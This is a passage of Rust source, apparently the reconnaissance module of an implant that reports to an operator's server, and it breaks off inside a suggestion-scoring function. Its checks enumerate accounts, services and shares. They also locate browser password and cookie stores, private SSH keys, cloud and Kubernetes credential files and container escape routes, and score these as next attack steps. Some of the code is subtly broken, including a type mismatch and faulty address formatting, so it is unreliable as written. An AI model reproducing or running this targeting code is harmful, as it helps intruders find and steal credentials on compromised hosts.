//! Reconnaissance profiles.
//!
//! One `recon` task used to answer "what does this host look like" with a
//! report of the host facts, the environment and the domain edges.  That is
//! still true, but it is not enough: an operator who wants to know what a
//! machine holds asks a lot of small questions, and every one of them is a
//! round trip.
//!
//! A **profile** is a named bundle of checks.  One task runs the whole
//! bundle and answers with one structured report: the local users, the
//! groups, the network shares, the listening sockets, the scheduled tasks,
//! the services, the WMI subscriptions, the installed software, the browser
//! data, the cloud CLI configuration, the container escape surface, the
//! kernel modules, the eBPF programs, the SSH keys, the shell history and
//! the recent files.
//!
//! Every finding is a record with a kind, a name, a detail, a severity and
//! the place it was found, so the server can keep the findings and the
//! operator can filter them.
//!
//! Two rules hold everywhere in this module:
//!
//! * a check never reports a secret: the cloud configuration is reported by
//!   name and by path, never by content;
//! * a check never writes to the host and never leaves a file behind.

use std::collections::BTreeMap;
use std::path::Path;

use crate::upk::Value;

/// How serious a finding is.
pub const SEV_INFO: &str = "info";
pub const SEV_LOW: &str = "low";
pub const SEV_MEDIUM: &str = "medium";
pub const SEV_HIGH: &str = "high";

/// The largest number of findings one check may report.
pub const MAX_FINDINGS_PER_CHECK: usize = 200;

/// One finding of a profile.
#[derive(Clone, Debug)]
pub struct Finding {
    /// What the finding is about: user, group, share, listener, ...
    pub kind: String,
    /// The name of the thing that was found.
    pub name: String,
    /// What is worth knowing about it.
    pub detail: String,
    /// How serious it is.
    pub severity: String,
    /// Where it was found: a path, a command or a socket.
    pub source: String,
}

impl Finding {
    /// The finding as an upk map, the way it travels to the server.
    pub fn to_value(&self) -> Value {
        crate::upk::map(vec![
            ("kind", crate::upk::s(&self.kind)),
            ("name", crate::upk::s(&self.name)),
            ("detail", crate::upk::s(&self.detail)),
            ("severity", crate::upk::s(&self.severity)),
            ("source", crate::upk::s(&self.source)),
        ])
    }
}

/// One check of a profile.
pub struct CheckSpec {
    /// The name of the check: the operator may ask for it by name.
    pub name: &'static str,
    /// The group it belongs to: the profiles are built from the groups.
    pub group: &'static str,
    /// The platform it runs on: "any", "windows" or "unix".
    pub platforms: &'static str,
    /// The check itself.
    pub run: fn() -> Vec<Finding>,
}

/// The catalogue of the checks.
///
/// The order is the order the report reads in: the people first, then the
/// machine, then the things that reach outside of it.
pub fn checks() -> Vec<CheckSpec> {
    vec![
        CheckSpec { name: "users", group: "host", platforms: "any", run: check_users },
        CheckSpec { name: "groups", group: "host", platforms: "any", run: check_groups },
        CheckSpec { name: "shares", group: "host", platforms: "any", run: check_shares },
        CheckSpec { name: "listeners", group: "host", platforms: "any", run: check_listeners },
        CheckSpec { name: "scheduled", group: "host", platforms: "any", run: check_scheduled },
        CheckSpec { name: "services", group: "host", platforms: "any", run: check_services },
        CheckSpec { name: "software", group: "host", platforms: "any", run: check_software },
        CheckSpec { name: "browser", group: "host", platforms: "any", run: check_browser },
        CheckSpec { name: "sshkeys", group: "host", platforms: "any", run: check_ssh_keys },
        CheckSpec { name: "history", group: "host", platforms: "any", run: check_history },
        CheckSpec { name: "recent", group: "host", platforms: "any", run: check_recent },
        CheckSpec { name: "wmi", group: "windows", platforms: "windows", run: check_wmi },
        CheckSpec { name: "kernel", group: "kernel", platforms: "any", run: check_kernel },
        CheckSpec { name: "ebpf", group: "kernel", platforms: "unix", run: check_ebpf },
        CheckSpec { name: "cloud", group: "cloud", platforms: "any", run: check_cloud },
        CheckSpec { name: "container", group: "container", platforms: "any", run: check_container },
    ]
}

/// The groups of the checks.
pub const GROUPS: [&str; 5] = ["host", "windows", "kernel", "cloud", "container"];

/// The profiles: a named bundle of checks.
///
/// | profile | what it runs |
/// |---|---|
/// | `host` | the people, the machine and the traces the user left |
/// | `windows` | the host profile and the windows only checks |
/// | `linux` | the host profile and the kernel checks |
/// | `cloud` | the cloud CLI configuration |
/// | `container` | the container escape surface |
/// | `all` | everything there is |
pub fn profile_groups(profile: &str) -> Result<Vec<String>, String> {
    let groups: Vec<&str> = match profile {
        "" | "host" | "default" => vec!["host"],
        "windows" => vec!["host", "windows", "kernel"],
        "linux" | "unix" => vec!["host", "kernel"],
        "cloud" => vec!["cloud"],
        "container" => vec!["container"],
        "all" => GROUPS.to_vec(),
        other => {
            return Err(format!(
                "recon: the profile {other:?} is not one I know ({})",
                GROUPS.join(", ")
            ))
        }
    };
    Ok(groups.iter().map(|g| g.to_string()).collect())
}

/// The result of a profile.
pub struct Report {
    /// The profile that ran.
    pub profile: String,
    /// The findings, in the order the checks produced them.
    pub findings: Vec<Finding>,
    /// The checks that ran.
    pub ran: Vec<String>,
    /// The checks that were skipped (the wrong platform, or an unknown name).
    pub skipped: Vec<String>,
}

impl Report {
    /// The report the operator reads.
    pub fn text(&self) -> String {
        let mut out = String::new();
        out.push_str(&format!("profile : {}\n", self.profile));
        out.push_str(&format!(
            "checks  : {} run, {} skipped\n",
            self.ran.len(),
            self.skipped.len()
        ));
        out.push_str(&format!("findings: {}\n", self.findings.len()));
        if self.findings.is_empty() {
            return out;
        }
        out.push('\n');
        for finding in &self.findings {
            out.push_str(&format!(
                "[{:<6}] {:<12} {}\n",
                finding.severity, finding.kind, finding.name
            ));
            if !finding.detail.is_empty() {
                out.push_str(&format!("         {}\n", finding.detail));
            }
            if !finding.source.is_empty() {
                out.push_str(&format!("         at {}\n", finding.source));
            }
        }
        out
    }

    /// The findings as an upk map, the way they travel to the server.
    pub fn to_value(&self) -> Value {
        let items: Vec<Value> = self.findings.iter().map(|f| f.to_value()).collect();
        crate::upk::map(vec![
            ("profile", crate::upk::s(&self.profile)),
            ("findings", crate::upk::arr(items)),
            ("total", crate::upk::u(self.findings.len() as u64)),
            ("ran", crate::upk::arr(
                self.ran.iter().map(|c| crate::upk::s(c)).collect(),
            )),
            ("skipped", crate::upk::arr(
                self.skipped.iter().map(|c| crate::upk::s(c)).collect(),
            )),
        ])
    }
}

/// Run a profile.
///
/// The profile names the bundle, and the operator may name the checks
/// explicitly: when the list is given, it wins over the profile.
pub fn run(profile: &str, wanted: &[String]) -> Result<Report, String> {
    let groups = profile_groups(profile)?;
    let catalogue = checks();
    let platform = if cfg!(windows) { "windows" } else { "unix" };
    let mut report = Report {
        profile: if profile.is_empty() { "host".to_string() } else { profile.to_string() },
        findings: Vec::new(),
        ran: Vec::new(),
        skipped: Vec::new(),
    };
    for spec in catalogue {
        let chosen = if wanted.is_empty() {
            groups.iter().any(|g| g == spec.group)
        } else {
            wanted.iter().any(|w| w == spec.name)
        };
        if !chosen {
            continue;
        }
        if spec.platforms != "any" && spec.platforms != platform {
            report.skipped.push(spec.name.to_string());
            continue;
        }
        report.ran.push(spec.name.to_string());
        let mut found = (spec.run)();
        found.truncate(MAX_FINDINGS_PER_CHECK);
        report.findings.extend(found);
    }
    if wanted.is_empty() && report.ran.is_empty() {
        return Err("recon: the profile ran nothing".to_string());
    }
    Ok(report)
}

// ---------------------------------------------------------------------------
// the helpers
// ---------------------------------------------------------------------------

/// Run a command and keep its output.
///
/// The output is the only thing the checks read: a check never keeps a
/// handle and never waits for a process.
fn capture(command: &str) -> String {
    let outcome = crate::task::shell(command, 20);
    String::from_utf8_lossy(&outcome.out).to_string()
}

/// A finding about a file.
fn file_finding(kind: &str, path: &str, detail: &str, severity: &str) -> Finding {
    Finding {
        kind: kind.to_string(),
        name: path.to_string(),
        detail: detail.to_string(),
        severity: severity.to_string(),
        source: path.to_string(),
    }
}

/// The size of a file, in bytes.
fn size_of(path: &Path) -> u64 {
    std::fs::metadata(path).map(|m| m.len()).unwrap_or(0)
}

/// The home directory of the user the implant runs as.
fn home() -> String {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_default()
}

/// The list of paths that exist.
fn existing(paths: &[String]) -> Vec<String> {
    paths
        .iter()
        .filter(|p| Path::new(p.as_str()).exists())
        .cloned()
        .collect()
}

// ---------------------------------------------------------------------------
// the checks
// ---------------------------------------------------------------------------

/// The local users.
#[cfg(unix)]
fn check_users() -> Vec<Finding> {
    let mut out = Vec::new();
    if let Ok(text) = std::fs::read_to_string("/etc/passwd") {
        for line in text.lines() {
            let fields: Vec<&str> = line.split(':').collect();
            if fields.len() < 7 || fields[0].is_empty() {
                continue;
            }
            let uid: u32 = fields[2].parse().unwrap_or(u32::MAX);
            let detail = format!("uid {} shell {}", fields[2], fields[6]);
            let severity = if uid == 0 {
                SEV_HIGH
            } else if fields[6].ends_with("nologin") || fields[6].ends_with("false") {
                SEV_INFO
            } else {
                SEV_LOW
            };
            out.push(Finding {
                kind: "user".to_string(),
                name: fields[0].to_string(),
                detail,
                severity: severity.to_string(),
                source: "/etc/passwd".to_string(),
            });
        }
    }
    out
}

/// The local users.
#[cfg(windows)]
fn check_users() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("net user");
    for line in text.lines() {
        let name = line.trim();
        if name.is_empty() || name.starts_with("The command") || name.contains(' ') {
            continue;
        }
        if name.ends_with("----------") {
            continue;
        }
        out.push(Finding {
            kind: "user".to_string(),
            name: name.to_string(),
            detail: "a local account".to_string(),
            severity: SEV_LOW.to_string(),
            source: "net user".to_string(),
        });
    }
    out
}

/// The local groups.
#[cfg(unix)]
fn check_groups() -> Vec<Finding> {
    let mut out = Vec::new();
    if let Ok(text) = std::fs::read_to_string("/etc/group") {
        for line in text.lines() {
            let fields: Vec<&str> = line.split(':').collect();
            if fields.len() < 4 || fields[0].is_empty() {
                continue;
            }
            let members: Vec<&str> = fields[3].split(',').filter(|m| !m.is_empty()).collect();
            let severity = if members.is_empty() { SEV_INFO } else { SEV_LOW };
            out.push(Finding {
                kind: "group".to_string(),
                name: fields[0].to_string(),
                detail: format!("{} member(s): {}", members.len(), members.join(", ")),
                severity: severity.to_string(),
                source: "/etc/group".to_string(),
            });
        }
    }
    out
}

/// The local groups.
#[cfg(windows)]
fn check_groups() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("net localgroup");
    for line in text.lines() {
        let name = line.trim_end();
        if name.is_empty() || name.starts_with("Alias") || name.starts_with("The command") {
            continue;
        }
        if name.contains(' ') {
            continue;
        }
        out.push(Finding {
            kind: "group".to_string(),
            name: name.to_string(),
            detail: "a local group".to_string(),
            severity: SEV_LOW.to_string(),
            source: "net localgroup".to_string(),
        });
    }
    out
}

/// The network shares.
#[cfg(unix)]
fn check_shares() -> Vec<Finding> {
    let mut out = Vec::new();
    if let Ok(text) = std::fs::read_to_string("/proc/mounts") {
        for line in text.lines() {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() < 3 {
                continue;
            }
            let kind = fields[2];
            if kind != "cifs" && kind != "nfs" && kind != "nfs4" && kind != "smb3" {
                continue;
            }
            out.push(Finding {
                kind: "share".to_string(),
                name: fields[1].to_string(),
                detail: format!("{} on {}", kind, fields[0]),
                severity: SEV_MEDIUM.to_string(),
                source: "/proc/mounts".to_string(),
            });
        }
    }
    out
}

/// The network shares.
#[cfg(windows)]
fn check_shares() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("net share");
    for line in text.lines().skip(2) {
        let name = line.trim();
        if name.is_empty() || name.starts_with("The command") || name.starts_with("Share name") {
            continue;
        }
        let mut parts = name.split_whitespace();
        let share = parts.next().unwrap_or("").to_string();
        let detail = parts.collect::<Vec<&str>>().join(" ");
        out.push(Finding {
            kind: "share".to_string(),
            name: share,
            detail,
            severity: SEV_MEDIUM.to_string(),
            source: "net share".to_string(),
        });
    }
    out
}

/// The listening sockets.
fn check_listeners() -> Vec<Finding> {
    let mut out = Vec::new();
    #[cfg(unix)]
    {
        for file in ["/proc/net/tcp", "/proc/net/tcp6"] {
            let text = match std::fs::read_to_string(file) {
                Ok(text) => text,
                Err(_) => continue,
            };
            for line in text.lines().skip(1) {
                let fields: Vec<&str> = line.split_whitespace().collect();
                if fields.len() < 4 || fields[3] != "0A" {
                    continue;
                }
                let local = fields[1];
                let detail = if local.starts_with("00000000") || local.starts_with("0000000000000000")
                {
                    "listening on every address".to_string()
                } else {
                    format!("listening on {}", hex_address(local))
                };
                out.push(Finding {
                    kind: "listener".to_string(),
                    name: hex_address(local),
                    detail,
                    severity: SEV_INFO.to_string(),
                    source: file.to_string(),
                });
            }
        }
    }
    #[cfg(windows)]
    {
        let text = capture("netstat -ano -p tcp");
        for line in text.lines() {
            if !line.contains("LISTENING") {
                continue;
            }
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() < 2 {
                continue;
            }
            out.push(Finding {
                kind: "listener".to_string(),
                name: fields[1].to_string(),
                detail: "a socket that waits for a connection".to_string(),
                severity: SEV_INFO.to_string(),
                source: "netstat -ano".to_string(),
            });
        }
    }
    out
}

/// The address of a socket, out of the hexadecimal form of procfs.
fn hex_address(value: &str) -> String {
    let (addr, port) = value.split_once(':').unwrap_or((value, "0"));
    let port = u16::from_str_radix(port, 16).unwrap_or(0);
    let mut bytes: Vec<u8> = Vec::new();
    let chars: Vec<char> = addr.chars().collect();
    let mut index = 0;
    while index + 1 < chars.len() {
        let pair: String = chars[index..index + 2].iter().collect();
        bytes.push(u8::from_str_radix(&pair, 16).unwrap_or(0));
        index += 2;
    }
    // procfs writes the address in the order of the machine, so the bytes
    // of every four byte group are the other way round.
    let mut ordered: Vec<u8> = Vec::new();
    for chunk in bytes.chunks(4).rev() {
        ordered.extend_from_slice(chunk);
    }
    let ip = if ordered.len() == 4 {
        format!("{}.{}.{}.{}", ordered[0], ordered[1], ordered[2], ordered[3])
    } else if ordered.len() == 16 {
        let groups: Vec<String> = ordered
            .chunks(2)
            .map(|c| format!("{:x}{:x}", c[0], c[1]))
            .collect();
        groups.join(":")
    } else {
        return format!("{value}");
    };
    format!("{ip}:{port}")
}

/// The scheduled tasks.
#[cfg(unix)]
fn check_scheduled() -> Vec<Finding> {
    let mut out = Vec::new();
    let mut paths = vec!["/etc/crontab".to_string(), "/etc/anacrontab".to_string()];
    if let Ok(entries) = std::fs::read_dir("/etc/cron.d") {
        for entry in entries.flatten() {
            paths.push(entry.path().to_string_lossy().to_string());
        }
    }
    for path in existing(&paths) {
        let detail = std::fs::read_to_string(&path)
            .map(|text| {
                let lines: Vec<&str> = text
                    .lines()
                    .filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#'))
                    .count();
                format!("{lines} entr(y|ies)")
            })
            .unwrap_or_else(|_| "a cron file".to_string());
        out.push(file_finding("scheduled", &path, &detail, SEV_LOW));
    }
    if let Ok(entries) = std::fs::read_dir("/etc/systemd/system") {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if !name.ends_with(".timer") {
                continue;
            }
            out.push(file_finding(
                "scheduled",
                &entry.path().to_string_lossy(),
                "a systemd timer",
                SEV_LOW,
            ));
        }
    }
    out
}

/// The scheduled tasks.
#[cfg(windows)]
fn check_scheduled() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("schtasks /query /fo csv /nh");
    for line in text.lines() {
        let fields: Vec<&str> = line.split(',').map(|f| f.trim().trim_matches('"')).collect();
        if fields.len() < 2 || fields[0].is_empty() {
            continue;
        }
        out.push(Finding {
            kind: "scheduled".to_string(),
            name: fields[0].to_string(),
            detail: fields.get(3).copied().unwrap_or("a scheduled task").to_string(),
            severity: SEV_LOW.to_string(),
            source: "schtasks /query".to_string(),
        });
    }
    out
}

/// The services.
#[cfg(unix)]
fn check_services() -> Vec<Finding> {
    let mut out = Vec::new();
    let mut paths: Vec<String> = Vec::new();
    if let Ok(entries) = std::fs::read_dir("/etc/systemd/system") {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.ends_with(".service") {
                paths.push(entry.path().to_string_lossy().to_string());
            }
        }
    }
    for path in existing(&paths) {
        out.push(file_finding("service", &path, "a systemd service", SEV_INFO));
    }
    out
}

/// The services.
#[cfg(windows)]
fn check_services() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("sc query state= all");
    for line in text.lines() {
        let name = line.trim();
        if !name.starts_with("SERVICE_NAME:") {
            continue;
        }
        let service = name.trim_start_matches("SERVICE_NAME:").trim().to_string();
        out.push(Finding {
            kind: "service".to_string(),
            name: service,
            detail: "a service of the host".to_string(),
            severity: SEV_INFO.to_string(),
            source: "sc query".to_string(),
        });
    }
    out
}

/// The installed software.
#[cfg(unix)]
fn check_software() -> Vec<Finding> {
    let mut out = Vec::new();
    if let Ok(text) = std::fs::read_to_string("/var/lib/dpkg/status") {
        let mut name = String::new();
        let mut version = String::new();
        for line in text.lines() {
            if let Some(rest) = line.strip_prefix("Package: ") {
                name = rest.trim().to_string();
            } else if let Some(rest) = line.strip_prefix("Version: ") {
                version = rest.trim().to_string();
            } else if line.is_empty() && !name.is_empty() {
                out.push(Finding {
                    kind: "software".to_string(),
                    name: name.clone(),
                    detail: format!("version {version}"),
                    severity: SEV_INFO.to_string(),
                    source: "/var/lib/dpkg/status".to_string(),
                });
                name.clear();
                version.clear();
            }
        }
    }
    out
}

/// The installed software.
#[cfg(windows)]
fn check_software() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName");
    for line in text.lines() {
        let name = match line.split_once("DisplayName    REG_SZ") {
            Some((_, rest)) => rest.trim().to_string(),
            None => continue,
        };
        if name.is_empty() {
            continue;
        }
        out.push(Finding {
            kind: "software".to_string(),
            name,
            detail: "an installed program".to_string(),
            severity: SEV_INFO.to_string(),
            source: "the uninstall registry".to_string(),
        });
    }
    out
}

/// The browser data.
fn check_browser() -> Vec<Finding> {
    let mut out = Vec::new();
    let home = home();
    let mut roots: Vec<String> = Vec::new();
    #[cfg(windows)]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let roaming = std::env::var("APPDATA").unwrap_or_default();
        if !local.is_empty() {
            roots.push(format!("{local}\\Google\\Chrome\\User Data"));
            roots.push(format!("{local}\\Microsoft\\Edge\\User Data"));
        }
        if !roaming.is_empty() {
            roots.push(format!("{roaming}\\Mozilla\\Firefox\\Profiles"));
        }
    }
    #[cfg(unix)]
    {
        if !home.is_empty() {
            roots.push(format!("{home}/.config/google-chrome"));
            roots.push(format!("{home}/.config/chromium"));
            roots.push(format!("{home}/.config/microsoft-edge"));
            roots.push(format!("{home}/.mozilla/firefox"));
        }
    }
    for root in roots {
        if !Path::new(&root).exists() {
            continue;
        }
        let mut interesting: Vec<String> = Vec::new();
        collect_named(&root, 3, &["Login Data", "Cookies", "Local State", "logins.json", "key4.db", "cert9.db"], &mut interesting);
        for path in interesting {
            let size = size_of(Path::new(&path));
            out.push(file_finding(
                "browser",
                &path,
                &format!("{size} bytes of browser data"),
                SEV_MEDIUM,
            ));
        }
    }
    out
}

/// The files with one of the names, under a directory.
fn collect_named(root: &str, depth: usize, names: &[&str], out: &mut Vec<String>) {
    if depth == 0 || out.len() >= MAX_FINDINGS_PER_CHECK {
        return;
    }
    let entries = match std::fs::read_dir(root) {
        Ok(entries) => entries,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().to_string();
        if path.is_dir() {
            collect_named(&path.to_string_lossy(), depth - 1, names, out);
            continue;
        }
        if names.iter().any(|wanted| *wanted == name) {
            out.push(path.to_string_lossy().to_string());
        }
    }
}

/// The SSH keys of the user and of the host.
fn check_ssh_keys() -> Vec<Finding> {
    let mut out = Vec::new();
    let home = home();
    let mut paths: Vec<String> = Vec::new();
    if !home.is_empty() {
        paths.push(format!("{home}/.ssh"));
    }
    paths.push("/etc/ssh".to_string());
    for root in paths {
        if !Path::new(&root).exists() {
            continue;
        }
        let entries = match std::fs::read_dir(&root) {
            Ok(entries) => entries,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            let path = entry.path();
            if path.is_dir() {
                continue;
            }
            let interesting = name.starts_with("id_")
                || name == "authorized_keys"
                || name == "authorized_keys2"
                || name.starts_with("ssh_host_");
            if !interesting {
                continue;
            }
            let private = name.starts_with("id_") && !name.ends_with(".pub");
            let severity = if private { SEV_HIGH } else { SEV_MEDIUM };
            let detail = if private {
                "a private key: it opens the hosts that trust it"
            } else {
                "a public key or a host key"
            };
            out.push(file_finding("sshkey", &path.to_string_lossy(), detail, severity));
        }
    }
    out
}

/// The shell history.
fn check_history() -> Vec<Finding> {
    let mut out = Vec::new();
    let home = home();
    let mut paths: Vec<String> = Vec::new();
    if !home.is_empty() {
        paths.push(format!("{home}/.bash_history"));
        paths.push(format!("{home}/.zsh_history"));
        paths.push(format!("{home}/.python_history"));
        paths.push(format!("{home}/.psql_history"));
        paths.push(format!("{home}/.mysql_history"));
        paths.push(format!(
            "{home}/.config/powershell/Microsoft.PowerShell/PSReadLine/ConsoleHost_history.txt"
        ));
    }
    for path in existing(&paths) {
        let lines = std::fs::read_to_string(&path)
            .map(|text| text.lines().count())
            .unwrap_or(0);
        out.push(file_finding(
            "history",
            &path,
            &format!("{lines} line(s) of command history"),
            SEV_MEDIUM,
        ));
    }
    out
}

/// The files that were touched recently.
fn check_recent() -> Vec<Finding> {
    let mut out = Vec::new();
    let home = home();
    if home.is_empty() {
        return out;
    }
    let mut roots = vec![home.clone()];
    for name in ["Desktop", "Documents", "Downloads"] {
        let path = format!("{home}/{name}");
        if Path::new(&path).exists() {
            roots.push(path);
        }
    }
    let mut rows: Vec<(std::time::SystemTime, String)> = Vec::new();
    for root in roots {
        if let Ok(entries) = std::fs::read_dir(&root) {
            for entry in entries.flatten() {
                let path = entry.path();
                if !path.is_file() {
                    continue;
                }
                if let Ok(meta) = entry.metadata() {
                    if let Ok(modified) = meta.modified() {
                        rows.push((modified, path.to_string_lossy().to_string()));
                    }
                }
            }
        }
    }
    rows.sort_by(|a, b| b.0.cmp(&a.0));
    for (_, path) in rows.into_iter().take(20) {
        out.push(file_finding("recent", &path, "a file that was touched recently", SEV_INFO));
    }
    out
}

/// The WMI subscriptions: the persistence that survives a reboot.
fn check_wmi() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("wmic /namespace:\\\\root\\subscription PATH __EventFilter GET Name,Query /format:list");
    let mut name = String::new();
    let mut query = String::new();
    for line in text.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix("Name=") {
            name = rest.trim().to_string();
        } else if let Some(rest) = trimmed.strip_prefix("Query=") {
            query = rest.trim().to_string();
            if !name.is_empty() {
                out.push(Finding {
                    kind: "wmi".to_string(),
                    name: name.clone(),
                    detail: if query.is_empty() {
                        "a WMI event filter".to_string()
                    } else {
                        format!("a WMI event filter: {query}")
                    },
                    severity: SEV_HIGH.to_string(),
                    source: "root\\subscription".to_string(),
                });
                name.clear();
                query.clear();
            }
        }
    }
    out
}

/// The kernel modules and the drivers.
#[cfg(unix)]
fn check_kernel() -> Vec<Finding> {
    let mut out = Vec::new();
    if let Ok(text) = std::fs::read_to_string("/proc/modules") {
        for line in text.lines() {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.is_empty() {
                continue;
            }
            out.push(Finding {
                kind: "module".to_string(),
                name: fields[0].to_string(),
                detail: "a kernel module that is loaded".to_string(),
                severity: SEV_INFO.to_string(),
                source: "/proc/modules".to_string(),
            });
        }
    }
    out
}

/// The kernel modules and the drivers.
#[cfg(windows)]
fn check_kernel() -> Vec<Finding> {
    let mut out = Vec::new();
    let text = capture("driverquery /fo csv /nh");
    for line in text.lines() {
        let fields: Vec<&str> = line.split(',').map(|f| f.trim().trim_matches('"')).collect();
        if fields.is_empty() || fields[0].is_empty() {
            continue;
        }
        out.push(Finding {
            kind: "module".to_string(),
            name: fields[0].to_string(),
            detail: "a driver of the host".to_string(),
            severity: SEV_INFO.to_string(),
            source: "driverquery".to_string(),
        });
    }
    out
}

/// The eBPF programs that are pinned on the host.
fn check_ebpf() -> Vec<Finding> {
    let mut out = Vec::new();
    let root = "/sys/fs/bpf";
    if !Path::new(root).exists() {
        return out;
    }
    let mut paths: Vec<String> = Vec::new();
    collect_named(root, 3, &[".o"], &mut paths);
    if paths.is_empty() {
        let mut names: Vec<String> = Vec::new();
        collect_names(root, 2, &mut names);
        for name in names {
            out.push(file_finding("ebpf", &name, "a pinned eBPF object", SEV_MEDIUM));
        }
        return out;
    }
    for path in paths {
        out.push(file_finding("ebpf", &path, "a pinned eBPF object", SEV_MEDIUM));
    }
    out
}

/// The names under a directory.
fn collect_names(root: &str, depth: usize, out: &mut Vec<String>) {
    if depth == 0 || out.len() >= MAX_FINDINGS_PER_CHECK {
        return;
    }
    let entries = match std::fs::read_dir(root) {
        Ok(entries) => entries,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        out.push(path.to_string_lossy().to_string());
        if path.is_dir() {
            collect_names(&path.to_string_lossy(), depth - 1, out);
        }
    }
}

/// The cloud CLI configuration of the host.
///
/// The names of the files and the names of the environment variables are
/// reported; the values never are.
fn check_cloud() -> Vec<Finding> {
    let mut out = Vec::new();
    let home = home();
    let mut paths: Vec<String> = Vec::new();
    if !home.is_empty() {
        paths.push(format!("{home}/.aws/credentials"));
        paths.push(format!("{home}/.aws/config"));
        paths.push(format!("{home}/.azure/azureProfile.json"));
        paths.push(format!("{home}/.azure/accessTokens.json"));
        paths.push(format!("{home}/.config/gcloud/credentials.db"));
        paths.push(format!("{home}/.config/gcloud/application_default_credentials.json"));
        paths.push(format!("{home}/.kube/config"));
        paths.push(format!("{home}/.docker/config.json"));
        paths.push(format!("{home}/.config/doctl/config.yaml"));
    }
    paths.push("/var/run/secrets/kubernetes.io/serviceaccount/token".to_string());
    paths.push("/var/run/secrets/aws-sa/credentials".to_string());
    paths.push("/etc/kubernetes/admin.conf".to_string());
    for path in existing(&paths) {
        let size = size_of(Path::new(&path));
        out.push(file_finding(
            "cloud",
            &path,
            &format!("{size} bytes of cloud configuration"),
            SEV_HIGH,
        ));
    }
    // The environment names the cloud too: the value never travels.
    for name in [
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "AWS_PROFILE",
        "AZURE_CLIENT_ID",
        "AZURE_TENANT_ID",
        "AZURE_CLIENT_SECRET",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "KUBECONFIG",
        "GCP_PROJECT",
    ] {
        if std::env::var(name).is_ok() {
            out.push(Finding {
                kind: "cloud".to_string(),
                name: name.to_string(),
                detail: "an environment variable that points at a cloud credential".to_string(),
                severity: SEV_MEDIUM.to_string(),
                source: "the environment".to_string(),
            });
        }
    }
    out
}

/// The container escape surface of the host.
fn check_container() -> Vec<Finding> {
    let mut out = Vec::new();
    // The runtime socket: whoever may talk to it is root on the host.
    let sockets = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/run/containerd/containerd.sock",
        "/run/podman/podman.sock",
        "/run/crio/crio.sock",
    ];
    for socket in sockets {
        if Path::new(socket).exists() {
            out.push(file_finding(
                "container",
                socket,
                "the runtime socket: it is root on the host",
                SEV_HIGH,
            ));
        }
    }
    // The markers: they say that the implant runs inside a container.
    for marker in ["/.dockerenv", "/run/.containerenv"] {
        if Path::new(marker).exists() {
            out.push(file_finding("container", marker, "the host runs in a container", SEV_MEDIUM));
        }
    }
    // The mounted secrets.
    let mut secrets: Vec<String> = Vec::new();
    for root in ["/var/run/secrets", "/run/secrets"] {
        if Path::new(root).exists() {
            collect_names(root, 3, &mut secrets);
        }
    }
    for path in secrets {
        out.push(file_finding(
            "container",
            &path,
            "a secret that is mounted into the container",
            SEV_HIGH,
        ));
    }
    // The capabilities of the process: the escape surface in one number.
    if let Ok(text) = std::fs::read_to_string("/proc/self/status") {
        for line in text.lines() {
            if let Some(rest) = line.strip_prefix("CapEff:") {
                let caps = rest.trim().to_string();
                let severity = if caps == "0000000000000000" {
                    SEV_INFO
                } else {
                    SEV_MEDIUM
                };
                out.push(Finding {
                    kind: "container".to_string(),
                    name: "the capabilities of the process".to_string(),
                    detail: format!("CapEff {caps}"),
                    severity: severity.to_string(),
                    source: "/proc/self/status".to_string(),
                });
            }
        }
    }
    // The namespaces: the way out of the container.
    let namespaces = Path::new("/proc/self/ns");
    if namespaces.exists() {
        let mut names: Vec<String> = Vec::new();
        collect_names("/proc/self/ns", 1, &mut names);
        if !names.is_empty() {
            out.push(Finding {
                kind: "container".to_string(),
                name: "the namespaces of the process".to_string(),
                detail: format!("{} namespace(s)", names.len()),
                severity: SEV_INFO.to_string(),
                source: "/proc/self/ns".to_string(),
            });
        }
    }
    out
}

// ---------------------------------------------------------------------------
// the suggestions
// ---------------------------------------------------------------------------

/// One suggestion: what to try next, and why.
#[derive(Clone, Debug)]
pub struct Suggestion {
    /// What the operator could do.
    pub title: String,
    /// Why the framework thinks it is worth trying.
    pub why: String,
    /// How promising it is: 0 is nothing, 100 is the whole machine.
    pub score: u64,
    /// The task that would try it.
    pub action: String,
    /// The task kind.
    pub kind: String,
    /// The arguments of the task.
    pub args: Vec<(String, String)>,
}

impl Suggestion {
    /// The suggestion as an upk map.
    pub fn to_value(&self) -> Value {
        let args: Vec<Value> = self
            .args
            .iter()
            .map(|(k, v)| crate::upk::map(vec![("name", crate::upk::s(k)), ("value", crate::upk::s(v))]))
            .collect();
        crate::upk::map(vec![
            ("title", crate::upk::s(&self.title)),
            ("why", crate::upk::s(&self.why)),
            ("score", crate::upk::u(self.score)),
            ("action", crate::upk::s(&self.action)),
            ("kind", crate::upk::s(&self.kind)),
            ("args", crate::upk::arr(args)),
        ])
    }
}

/// Score the findings and say what could be tried next.
///
/// The framework collects the facts and scores them; the decision stays with
/// the operator.  Every suggestion says which finding it came from.
pub fn suggest(findings: &[Finding]) -> Vec<Suggestion> {
    let mut out: Vec<Suggestion> = Vec::new();
    let mut seen: BTreeMap<String, ()> = BTreeMap::new();
    for finding in findings {
